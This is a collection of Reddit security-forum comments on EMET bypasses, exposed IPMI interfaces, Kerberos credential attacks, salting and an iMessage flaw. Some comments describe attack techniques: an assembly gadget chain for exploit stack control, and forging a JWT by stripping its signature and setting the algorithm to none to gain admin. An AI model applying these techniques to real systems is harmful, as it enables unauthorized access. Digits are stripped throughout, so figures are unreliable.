1111009,0,t1_chugdbw,HiyaI hadnt actually heard of AntiDetours as it was not present when I developed the original exploit first presented almost a year ago to the day. It looks easy enough to get around though. I dont agree that it would significantly complicate using LoadLibraryA. I suspect one could simply utilize several primitives to extract the destination address the EMET hook jmps to and then use that instead of actually hitting kernel.dllKERNELBASE.dll at all though I havent tried. I agree on your comment regarding SimExecFlow I honestly wasnt aware that it would terminate when it hits a branchthanks for pointing it out As for the stack pivot I purposely kept a lot of the more lowlevel details in the actual exploit. I was hoping to encourage readers to dig deeper than the fairly highlevel writeup and inspect the exploit code itself. If youre curious the primitive I used to gain stack control was the following I suppose pivot is not the most appopriate noun so lets go with adjustment. The StackPivot mitigation from EMET is irrelevant in this case as esp is never far from its home on the stack    mov ecx ebpxc  lt gets me an address on the stack      push ebpx     lt easily disposed of w my next primitive      mov esi eax        lt inconsequential      mov eax ecx      lt can be used to point to a controlled stack address      call eaxx     lt controlled deref and call to arbitrary addressI happened across this after searching for quite some time... time that I could have saved had I read jducks blog post here Anywho thx for the feedback and stuff.,netsec,chukw24,3,t5_1rqwi

Never imagined that so many folks would leave their ipmi interfaces exposed so widely on the net and similar to SCADA stuff there was so little focus on security in the design. With so many thirdparty IT folks managing IT infrastructure this is a huge issue. Access to IPMI is a big deal. HP ILO for example iLO makes it possible to perform activities on an HP server from a remote location. The iLO card has a separate network connection and its own IP address to which one can connect via HTTPS. Possible options are    Reset the server in case the server doesnt respond anymore via the normal network card    Powerup the server possible to do this from a remote location even if the server is shut down    Remote console in some cases however an Advanced license may be required for some of the utilities to work    Mount remote physical CDDVD drive or image    Access the servers IML Integrated Management Log    Can be manipulated remotely through XMLbased Remote Insight Board Command Language RIBCL    Full CLI support through RS port shared with system though the inability to enter Function keys prevents certain operationsiLO provides some other utilities like virtual media CD floppy virtual power and a remote console. iLO is either embedded on the system board or available as a PCI card. from wikipedia,netsec,ci6cctf,1,t5_1rqwi

2014061,0,t3_2ht0dx,Without going into too much detail they have clearly not done a very thorough job of REing EMET.  The flag they overwrite is in fact not the ROP configuration data which is located in a separate struct the actual configuration struct as opposed to the hooked functions array that they call the configuration struct here but rather the flag that indicates that the hooks were initialized successfully.  This of course does not invalidate the fact that the trick works but one would hope that they would at least identify why it works.  In any case now that they have pointed this out Microsoft will just add the same writeprotection scheme to this struct that currently applies to the others which makes important data unwritable when not being updated by EMET.Incidentally their ability to use this trick to get around EAF is a result of the refactoring that was done between the last Tech Preview and RTM.  All of the function hooks were unified into a single dispatcher hook which checked the hooked function array for metadata to determine which checks applied.  Even though the CONTEXTDEBUGREGISTERS check is only enabled for NtSetThreadContext and NtContinue the fact that it is routed through the dispatcher hook which contains the initialization check is what allows them to bypass it.  This would not have worked in Tech Preview .They also give an incorrect description of the new EAF functionality.,netsec,ckvw36p,45,t5_1rqwi

Due to the tightly coupled nature of an Active Directory forest it is possible for domain owners to use malicious methods to gain access to other domains in the forest. For example it is possible for a malicious domain owner to modify the system software on a domain controller and by so doing interfere with the operation of any domain in the forest view or manipulate forest configuration data view or manipulate data stored in any domain or view or manipulate data stored on any computer joined to the forest.

Chef is a configuration management system  when you have  servers you cant do them one by one you really need to have a brain controlling the software on them so that theyre identical.Anyway knife ssh is the chef command that would ssh to all the servers and run a command.  You can give your servers a role like webserver nameserver proxy etc and you can filter which servers you want knife ssh to interact with.  But running chefclient on  servers asking the chefserver what am I supposed to be? and getting all the relevant software updates etc simultaneously would take  and I swear to god this is true  upwards of  hours.  We were running chef  which used mysql as a backend and ... was not shall we say performance oriented.  It brought the chef server to its knees  and this was a quadproc coreperproc GB of ram box with  SSDs.So basically we had  servers all waiting on the chef server to respond for hours.Eventually we installed a small torrent client on all the servers moved to chefsolo same syntax same files but no centralized server and we would just check the chef shit out of the repo push it to all the boxes with bit torent and then use ansible to tell them all to run chef client on their own.,netsec,cnrj3x1,9,t5_1rqwi

4089000,0,t3_37fxu7,Looks interesting and congrats to them for launching! Some thoughts Seems pricey at  USD for two devices and  month console subscription from what I can gather on the website. Guess their targeting larger organisations. A lower cost and virtual images for the canary devices might make more sense not sure why the devices have to be physical. The devices communicate to the remote admin console hosted externally by the company on the internet via DNS. If an attacker already has some control over your gateway or whatever equivalent they may be able to block this making the device redundant. A self hosted admin console on a separate physical network would seem a better choice and given the price. What happens if the site canary.info or whatever domain they are using gets DDossed or has its DNS taken over then every canary device in every organisation may not be able to transmit alerts back to the console. Perhaps they have mitigations for something like this but no mention of it online. Seems like a useful product though will be keeping an eye on it.,netsec,crmdcyy,1,t5_1rqwi

4425884,0,t1_csoixiy,Im curious how plans like Googlebacked LinkNYC PDF Wiki will handle security. There is a statement about peer isolation which is good I suppose.This article does say they get encryption but it requires no authentication.gtUsers will receive an encrypted connection to the hotspot and will be able to access the network without logging in and out making for a seamless roaming experience.Another article offers little more information other than theyll be priming people further to use anonymous USB charging stations and that they are taking it seriouslygtODonell assured us that the network takes into account sort of every major potential attack out there for a wireless network. He downplayed the risk of rogue access points saying that the LinkNYC network has been fitted with safeguards against it. The fact of the matter is this is not a new security threat its been around for tenplus years and it can affect any major service provider out there. We do take this seriously and we actively shut those down ODonnell said.It also mentions theyre using HotSpot . .u which talks about its added discovery feature read metadataHotSpot . PDFgtA significant change with .u is that connectivity to multiple home networks can be advertised using a single SSID. For example the PublicHotspot SSID could be used to advertise that a Hotspot has the ability to automatically authenticate subscribers of a number of fixed or mobile operators.gtgtIn . clients learn about AP networks via beacons and probe response frames. Each beacon or probe response carries information about the APs capabilities in a component of the frame called an information element. Naturally the .u protocol focuses on enhancing network discovery by adding new information elements to these frames.It does go on to say if you want to be PassPort Certified you have to support EAP of TLS TLSMCHAPv SIM and AKA.

Theyll likely go to maintenance again after that.You can state a preference for where youd like to move but if you arent comfortable being moved to any of our locations at any time you are probably better off in a different job.

Youll be working closely with the software engineering teams as as a resident security authority. Youll also be checking IDS logs and working with tools like ThreatStack CrowdStrike Suricata etc. Prior experience with those exact tools is helpful but not necessary well get you up to speed regardless. More important is the ability to find real security flaws in applications and spot problems with source code.This is an ideal job for those who are technically competent and tired of working as a security consultant however you do not need to have been a consultant we will consider virtually any background as long as you have solid skills.Some report writing will be required for you to document and track vulnerabilities but you will not be using pages and pages of methodology or vulnerability diagram boilerplate. Most reports are about a page with a much simpler template and posted right to GitHub. Youll be doing more direct communication with engineers via IRC or Zoom about vulnerabilities you find than you will be writing a report about it.Speaking of GitHub we use it for everything. Even our HR and marketing teams use GitHub. We are a very engineeringheavy organization. We also offer a lot of support for remote employees  I work fully remote from NYC. We use a private IRC server and Slack for chat Zoom for video conferencing and we even have two Double Robotics robots in our office to remote into.Finally our tech stack consists of mostly Scala and Java on the backend and mostly JavaScript and Ruby on the frontend.

4747349,0,t1_ctsq1gt,Welllll the thing with cryptographic hardness or complexity is that a linear complexity is a linear complexity.e.g. On and On are essentially the same when youre thinking about the big picture.To put that in a hash cracking perspective the difference between cracking k passwords with the same salt or k passwords with unique salts is not going to change whether the attack is feasible or not. Yes cracking passwords with identical salts will require less work for a few reasons but it does not affect the feasibility of the attack.Salts are designed to prevent or make infeasible specific attacks e.g. pregenerated lookup tables. A persite rainbow table to attack a persite salt is really an infeasible attack so a peruser salt doesnt really buy you or your users anything if an attacker has a copy of your database.EDIT I will say that peruser random salt is undoubtedly the best practice. But given the threats that a salt is designed to address especially with web apps the difference is not enormous. If your database is compromised and in the hands of an attacker whether you used static or peruser salting is not going to make a measurable difference to the security of your users.,netsec,ctsy5ih,7,t5_1rqwi

My company has felt this pain from banks as they have forced us to implement some of the dumbest rules to satisfy some auditors checkbox.  An example of this we as developers are not allowed to deploy our own code to production.  Instead we have to create a ticket send it off to a team that knows NOTHING about software development and then wait for them to deploy the code to production we have an automated tool that does all the application deploy stuff for us.  Why do we have this dumbass rule? Because some auditor failed us for allowing developers to deploy code to production... Yeah. Like it would be hard at all to deploy malicious code with this new safe system.Banks hire these auditing firms to check security.  Most of these firms are composed completely of people who dont know a damn thing about software security.  So they invent every dumbass rule under the sun to try and encourage security.  Stuff that does nothing for security in the slightest.  These firms play from a rulebook written in the year  with rules like passwords should be hashed with MD.  You know rules that are so laughably out of date it makes you want to cry.Yet for all of that they still fail miserably and will do things like opening up an FTP port or authenticating over ,netsec,cua3etu,48,t5_1rqwi

4899023,0,t1_cuc0v1j,If we are to continue this were going to get super off topic and pedantic but  mins on a bus and nothing better to do D Like I said above I dont have the same perspective you do of common sense. I dont think that just because the majority of people do something that it is the sensible thing to do or way to do things.The majority of people are  terrible with computers. Like really bad. Even the average person in their early to mid twenties is functionally useless when it comes to computer security maintenance and general best practice. People older are generally even worse and people younger are worse still.I think that if you really took the actions most commonly taken by people when it comes to computer security you would end up quite quickly with a truly fucked installation.Common sense is relative to the scenario a person is in. A guy from the countryside who is renowned for his common sense will probably feel alien and made back choices if he is chucked in to a teeming metropolis. In the same way a the average person whos experiences with advertising tend to be unidirectional tv billboards signposts will make bad choices when suddenly they they transition to an environment where adverts are omnidirectional targeted and often harmful. Its unreasonable to say the average person has the same level of common sense on the internet than they do elsewhere.For people who take more of an interest even a passing interest such as googling how to block ads online will quickly be imparted with a great deal of common sense and best practice when it comes to the internet and security.We can see these people are in the minority simply by looking at the stats surrounding ad blocking software. The minority people who have adblock are the ones making the sensable choice the choice of people common to the area in this case the internet. You can think of people like you and I as locals in the metropolis that is the internet and others as visitors. I know that sounds pompous but the analogy works and kind of describles what Im trying to get across.Tldr the common action often isnt sensible and common sense is relative and disconnected from the average.,netsec,cuc26xw,1,t5_1rqwi

5939106,0,t3_3wnvm6,This article is a great example of not fully understanding the requirements to use metaploit modules. It was written by a script kiddie with no actual understanding of the underlying architecture. It requires deliberately misconfiguring your domain controllers deliberately using old software and a lot of avoiding following best practices to create this perfect scenario. Mitigation for these kinds of attacks include things like  Dont give users rootadmin rights Dont do troubleshootinglog onto other systems as a domain admin.  Dont perform interactive logons as an admin except on hardened systems like domain controllers.  Use smart cards.  Use modern software.  Whitelist applications in your environment Seriously how have you not fucking done this yet?If a company isnt following any of these scenarios they are being negligent. Lets break this article down because its far too doom and gloomy for my tastes.  gt Secret keys that use RC algorithm is not salted and use NTLM hash of the user as a key so NTLM hash  RC secret key. Yeah this will be your WTF moment.No. Hes referring to the deprecated RFC  RCHMACMD is not a supported encryption type on modern OSs is an option that is disabled by default in modern operating systems and exists for backwards compatibility purposes. Windows server  R and  do support it but primarily negotiate to AES  that said Ill give it to him. By default an out of the box Server  R AD will allow a downnegotiated RC session. It goes against any and all standardized hardening practices though. So maybe it was WTF back in  when it was released or  when people finally got rid of their Server  systems or in  but its a decade now. No newly deployed systems are vulnerable to this and old systems running  have been recommended to disable this for almost a decade now. gt User account validated only after TGT is more than  minutes old. For example if account is disabled or even existPartially True  You cant pass a nonexistent account to TGS using a TGT. If it doesnt exist the TGS has no information to respond to the TGT with. gt PAC data in service ticket is rarely validated. Usually only if service is running under SYSTEM account.No. Its actually the exact opposite In a nutshell two main conditions prevent PAC validation from occurring in Windows OS  the application has the SeTcbPrivilege privilege Act as part of the operating system the application is a service and the ValidateKdcPacSignature registry key is set to disable PAC validation.gt How do we prove to KDC that we who we are and request a TGT? Well we just encrypt current timestamp with our secret key. Thats how a normal process looks like. So if we have an access to the key  we can repeat this process on behalf of the user and gain legitimate kerberos tickets and thus access. Essentially skipping the part of kerberos authentication where user secret key is created from his passwordI dont think skipping means what you think it means. Youre still doing the handshake and encrypting the timestamp with the key. What are you skipping? Where you created the keytab? Thats not skipping a part of authentication  you have access to the keytab which means youve got access to the users account and elevated access on the system. Holy shit stop the presses having elevated access on a system allows you to do malicious things! Now a few comments on this attack. Its made possible because of several specific and Ill admit common bad practices. . Not using smart cards. Use of a smartcard prevents the keys from being stored in memory. Mimikatz cant pull keys if theyre not cached.. Allowing credentials to be cached which again is a bad security practice. The admin logged on interactively instead of correctly using remote or by using a nonprivileged account and performing a runas with netonly  . Not disabling the insecure providers.. Requires an older operating system Windows  that allows random programs to be run.These are all common issues so Ill give it to the author that yes you could pass the key. gt This way  as long as we have a valid NTLM hash or aes key  we can impersonate those users anytime we want from any machine! And they will stay valid until password is changed.No they stay valid for  hours. Unless you deliberately reconfigure your domain controllers to support RC then the NTLM hash can be used. The whole Passtheticket section is more of the same. If youve got full elevated access to an administrators box and theyre logged in interactively using their administrator credentials you can impersonate an administrator. Who knew? The Golden Ticket section requires you having compromised the domain controller. Second verse same as the first  if youve got system level access to a system you can access all of the sensitive information on it. A general user does not have rights to access the domain controllers memory and this attack requires being able to dump it something that is excessively easy to detect. Anyway lets get down to the detection section as the rest of this is just repeating bad info. gt Detecting this activity is a very hard challenge since we deal with legitimate credentials.No its trivial to detect this shit. First lets make a couple of things clear. Mimikatz is a memory dumper. It does not verify or validate these tokens or credentials  so your typical attacker will ALWAYS think they have struck gold. All I need to do is leave a honeypot system running with a forged LSASS and watch the attackers think theyve struck paydirt when they compromise my domain admin keys. Detecting illegitimate use of tickets Pass the key golden ticket etc is also trivial on all modern IDS systems. Lets look at the mitigation section. gtPassthekeyOverpassthehash The Protected Users group prevent storage of keys in memory so there is nothing to steal for members of this group but other users will stay vulnerable. Complete mitigation is possible only with Credential Guard.Somewhat true but no. In a properly configured network youre using smart cards or other token based authentication that doesnt store your credentials in memory like Credential Guard you are not vulnerable to this attack. gtPasstheticket Credential Guard is the only possible mitigation Protected Users cant help with this due to the need to store tickets in memory for normal operation.No because your understanding of what you did here is flawed. Its a replay attack and its vulnerability window is small not to mention easily detected. Once again smart cards would solve this problem.gtGolden amp Silver Ticket Mitigation for this type of attacks is not possible. Only remediation steps  see below.The mitigation is not letting your domain controllers get compromised and not allowing foreign software to run on it. Mimikatz cant dump the memory if its not allowed to run.gt Skeleton Key No mitigation possible however I think Protected Users should help with this since it deny usage of RC.See above. Youre talking about another implementation of mimikatz. Thats all. ,netsec,cxy5b21,58,t5_1rqwi

6988619,0,t3_4besfb,Ill repeat what I said on Hacker News hereIf youre struggling to understand the impact of this iMessage flaw remember that it requires either a Root CA or Apples help to work. If youre considering an attacker with access to a Root CA then you have problems far beyond iMessage crypto.It is certainly a good defenseindepth measure to implement the recommendations from JHU and its great that Apple has moved aggressively with them. Those mitigations will protect even from a catastrophic goto failtype bug in the future where you could strip away TLS.That leaves Apple cooperating with law enforcement or an Apple insider coerced or otherwise to launch this attack against one of their users. I think this scenario is unlikely given their very public reaction to the iOS  backdoor the FBI requested.Finally I think their development of the gzip oracle is pretty great and that it has the potential to work against other cryptosystems. This is probably not the last that youll hear of it. I suspect the JHU team is running down a list of other cryptosystems that it could work against right now...Also as tptacek pointed out unauthenticated crypto is bad mmmkkayyyyy?,netsec,d18i239,15,t5_1rqwi

Nobodys going to go up to someone on the street offer them a  week course in engineering then have them sling some girder at their sweet bridge startup.gtIm just not willing to give the developers a free pass. I know PHP doesnt help them but thats their job.Until were willing to really treat programming like an engineering discipline you have to operate under the assumption that your APIs are being consumed by someone who has no clue whats going on under the hood. Thats especially the case with PHP. PHP appeals to novices and tries to be so simple that anyone can use it but it simultaneously forces you to think about lowlevel concerns in order to use it securely.TBH if I had to fault anything other than PHP here itd be the culture that encourages people without proper training to perform this kind of work.

The client library then thinks the modified JWT is automatically valid and returns true valid JWT.So in the context of this blog instead of guessing the key just remove the signature change the algorithm to none and do everything else as the author describes ie change role to admin.,netsec,d30g8x7,3,t5_1rqwi

So when the browser connects the encryption libraries work out an encrypted tunnel first then the HTTP traffic is sent over this.There are other protocols that can work like this such as various email protocols such as SMTP and IMAP.  They can also connect first over plaintext and then initiate the secure layer.SSH while on the surface is a replacement for Telnet does a lot more.  It enables file transfers SFTP port forwarding reverse port forwarding SOCKS proxies and a slew of other things Im probably not even aware of.  It also allows for certificatebased authentication.So whereas HTTPS is just HTTP over an encrypted channel SSH is a completely different beast than Telnet.,netsec,dcl8mw6,4,t5_1rqwi

Instead of a PAM module on the client they use a helper application that acts like a PAM module to communicate back to the Vault server which acts as the CA. Another benefit of Vault is it is portable and not locked into AWS though Im sure one could port BLESS to the Serverless framework since BLESS relies on Lambda. ,netsec,ddkc9vc,4,t5_1rqwi

I get the personal reward in the discovery and helping but I was reading your panera bread story and I just dont get why you follow up so much.This seems mostly straightforward to me. Documenting and discussing the vulnerabilities via his blog is clearly part of the value of discovering them. If hes been responsible and wants to not get fucked for revealing live vulnerabilities and wants to put his name on them he needs the bug to be fixed before he can write about it.He has a reputational incentive to want to publish and needs their cooperation for that. Im not knocking that just saying that his interest to ensure its fixed is pretty aligned with his benefit from discovering it.,netsec,dehvl4h,6,t5_1rqwi
